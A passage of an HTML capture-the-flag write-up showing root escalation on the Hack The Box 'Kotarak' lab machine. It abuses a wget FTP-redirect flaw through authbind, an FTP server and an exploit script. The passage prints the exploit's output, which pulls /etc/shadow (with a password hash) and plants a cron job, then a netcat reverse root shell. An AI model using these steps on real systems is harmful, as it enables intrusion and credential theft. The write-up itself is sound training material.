+            <div class="codebox">
+                atanas@kotarak-dmz<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/ftp</span>$&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-perm&nbsp;-u=s&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+                [...]<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>authbind<span style="color:#ff9d00;font-weight:700">/</span>helper
+            </div>
+        </div><br>
+        <br>
+        Start the FTP server on privileged port 21 using <code>authbind</code>, and as a background job with <code>&amp;</code><br>
+            <div class="codebox">
+                atanas@kotarak-dmz<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/ftp</span>$&nbsp;authbind&nbsp;python&nbsp;-m&nbsp;pyftpdlib&nbsp;-p&nbsp;21&nbsp;-w&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;</span>
+            </div>
+        </div><br>
+        <br>
+        Start a listener on your attacking host (your kali machine) to receive the (eventual) reverse shell<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak<span style="color:#ff9d00;font-weight:700">/ftp</span>#&nbsp;nc&nbsp;-lvnp&nbsp;9005<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9005&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And lastly, run <code>wget-exploit.py</code>.<br>
+        You have to wait a little for this to exploit to work, because it's all cron jobs, but you'll eventually a receive a root shell on your listener.<br>
+            <div class="codebox">
+                atanas@kotarak-dmz<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/ftp</span>$&nbsp;authbind&nbsp;python&nbsp;wget-exploit.py<br>
+                Ready?&nbsp;Is&nbsp;your&nbsp;FTP&nbsp;server&nbsp;running?<br>
+                [I&nbsp;2019-10-22&nbsp;07<span style="color:#ff9d00;font-weight:700">:</span>48<span style="color:#ff9d00;font-weight:700">:</span>41]&nbsp;10.10.10.55<span style="color:#ff9d00;font-weight:700">:</span>57330-[]&nbsp;FTP&nbsp;session&nbsp;opened&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>connect<span style="color:#ff9d00;font-weight:700">)</span><br>
+                FTP&nbsp;found&nbsp;open&nbsp;on&nbsp;10.10.10.55<span style="color:#ff9d00;font-weight:700">:</span>21.&nbsp;Lets&nbsp;go&nbsp;<span style="color:#ff9d00;font-weight:700">then</span><br>
+                <br>
+                Serving&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;exploit&nbsp;on&nbsp;port&nbsp;80...<br>
+                <br>
+                <br>
+                We&nbsp;have&nbsp;a&nbsp;volunteer&nbsp;requesting&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>archive.tar.gz&nbsp;by&nbsp;GET&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>)<br>
+                <br>
+                Uploading&nbsp;.wgetrc&nbsp;via&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;redirect&nbsp;vuln.&nbsp;It&nbsp;should&nbsp;land&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root&nbsp;<br>
+                <br>
+                10.0.3.133&nbsp;-&nbsp;-&nbsp;[22<span style="color:#ff9d00;font-weight:700">/</span>Oct<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;07<span style="color:#ff9d00;font-weight:700">:</span>50<span style="color:#ff9d00;font-weight:700">:</span>01]&nbsp;<span style="color:#3ad900;font-weight:400">"GET&nbsp;/archive.tar.gz&nbsp;HTTP/1.1"</span>&nbsp;301&nbsp;-<br>
+                Sending&nbsp;redirect&nbsp;to&nbsp;<span style="color:#ff9d00;font-weight:700">ftp://</span>anonymous@10.10.10.55<span style="color:#ff9d00;font-weight:700">:</span>21<span style="color:#ff9d00;font-weight:700">/</span>.wgetrc&nbsp;<br>
+                <br>
+                [I&nbsp;2019-10-22&nbsp;07<span style="color:#ff9d00;font-weight:700">:</span>50<span style="color:#ff9d00;font-weight:700">:</span>01]&nbsp;10.0.3.133<span style="color:#ff9d00;font-weight:700">:</span>39252-[]&nbsp;FTP&nbsp;session&nbsp;opened&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>connect<span style="color:#ff9d00;font-weight:700">)</span><br>
+                [I&nbsp;2019-10-22&nbsp;07<span style="color:#ff9d00;font-weight:700">:</span>50<span style="color:#ff9d00;font-weight:700">:</span>01]&nbsp;10.0.3.133<span style="color:#ff9d00;font-weight:700">:</span>39252-[anonymous]&nbsp;USER&nbsp;<span style="color:#3ad900;font-weight:400">'anonymous'</span>&nbsp;logged&nbsp;in.<br>
+                [I&nbsp;2019-10-22&nbsp;07<span style="color:#ff9d00;font-weight:700">:</span>50<span style="color:#ff9d00;font-weight:700">:</span>01]&nbsp;10.0.3.133<span style="color:#ff9d00;font-weight:700">:</span>39252-[anonymous]&nbsp;RETR&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/ftp/</span>.wgetrc&nbsp;completed=1&nbsp;bytes=70&nbsp;seconds=0.0<br>
+                [I&nbsp;2019-10-22&nbsp;07<span style="color:#ff9d00;font-weight:700">:</span>50<span style="color:#ff9d00;font-weight:700">:</span>01]&nbsp;10.0.3.133<span style="color:#ff9d00;font-weight:700">:</span>39252-[anonymous]&nbsp;FTP&nbsp;session&nbsp;closed&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>disconnect<span style="color:#ff9d00;font-weight:700">)</span>.<br>
+                We&nbsp;have&nbsp;a&nbsp;volunteer&nbsp;requesting&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>archive.tar.gz&nbsp;by&nbsp;POST&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>)<br>
+                <br>
+                Received&nbsp;POST&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>,&nbsp;this&nbsp;should&nbsp;be&nbsp;the&nbsp;extracted&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>shadow&nbsp;<span style="color:#ff9d00;font-weight:700">file:</span>&nbsp;<br>
+                <br>
+                ---[begin]---<br>
+                &nbsp;root<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                daemon<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                bin<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                sys<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                <span style="color:#ff9d00;font-weight:700">sync:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                games<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                <span style="color:#ff9d00;font-weight:700">man:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                <span style="color:#ff9d00;font-weight:700">lp:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                mail<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                news<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                uucp<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                proxy<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                www-data<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                backup<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                list<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                irc<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                gnats<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                nobody<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                systemd-timesync<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                systemd-network<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                systemd-resolve<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                systemd-bus-proxy<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                syslog<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                _apt<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                sshd<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17366<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                ubuntu<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#7f0044;font-weight:400">$6$edpgQgfs$CcJqGkt</span>.zKOsMx1LCTCvqXyHCzvyCy1nsEg9pq1.dCUizK<span style="color:#ff9d00;font-weight:700">/</span>98r4bNtLueQr4ivipOiNlcpX26EqBTVD2o8w4h0<span style="color:#ff9d00;font-weight:700">:</span>17368<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                &nbsp;<br>
+                ---[eof]---<br>
+                <br>
+                <br>
+                Sending&nbsp;back&nbsp;a&nbsp;cronjob&nbsp;script&nbsp;as&nbsp;a&nbsp;thank-you&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">the</span>&nbsp;file...<br>
+                It&nbsp;should&nbsp;get&nbsp;saved&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>cron.d<span style="color:#ff9d00;font-weight:700">/</span>wget-root-shell&nbsp;on&nbsp;the&nbsp;victims&nbsp;host&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>because&nbsp;of&nbsp;.wgetrc&nbsp;we&nbsp;injected&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;the&nbsp;GET&nbsp;first&nbsp;response<span style="color:#ff9d00;font-weight:700">)</span><br>
+                10.0.3.133&nbsp;-&nbsp;-&nbsp;[22<span style="color:#ff9d00;font-weight:700">/</span>Oct<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;07<span style="color:#ff9d00;font-weight:700">:</span>52<span style="color:#ff9d00;font-weight:700">:</span>01]&nbsp;<span style="color:#3ad900;font-weight:400">"POST&nbsp;/archive.tar.gz&nbsp;HTTP/1.1"</span>&nbsp;200&nbsp;-<br>
+                <br>
+                File&nbsp;was&nbsp;served.&nbsp;Check&nbsp;on&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>hacked-via-wget&nbsp;on&nbsp;the&nbsp;victims&nbsp;host&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;a&nbsp;minute<span style="color:#ff9d00;font-weight:700">!</span>&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>)
+            </div>
+        </div><br>
+        <br>
+        A connection!<br>
+        We're root :)<br>
+            <div class="codebox">
+                listening&nbsp;on&nbsp;[any]&nbsp;9005&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.11]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.55]&nbsp;43644<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh:</span>&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;cant&nbsp;access&nbsp;tty<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;ls&nbsp;-alh</span><br>
+                total&nbsp;36K<br>
+                drwx------&nbsp;&nbsp;2&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Oct&nbsp;22&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>52&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;21&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Oct&nbsp;22&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>25&nbsp;..<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;65&nbsp;Sep&nbsp;19&nbsp;&nbsp;2017&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;3.1K&nbsp;Oct&nbsp;22&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;148&nbsp;Aug&nbsp;17&nbsp;&nbsp;2015&nbsp;.profile<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;33&nbsp;Jul&nbsp;20&nbsp;&nbsp;2017&nbsp;root.txt<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;75&nbsp;Jul&nbsp;19&nbsp;&nbsp;2017&nbsp;.selected_editor<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;5.2K&nbsp;Aug&nbsp;29&nbsp;&nbsp;2017&nbsp;.viminfo<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;cat&nbsp;root.txt</span><br>
+                950d1425...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
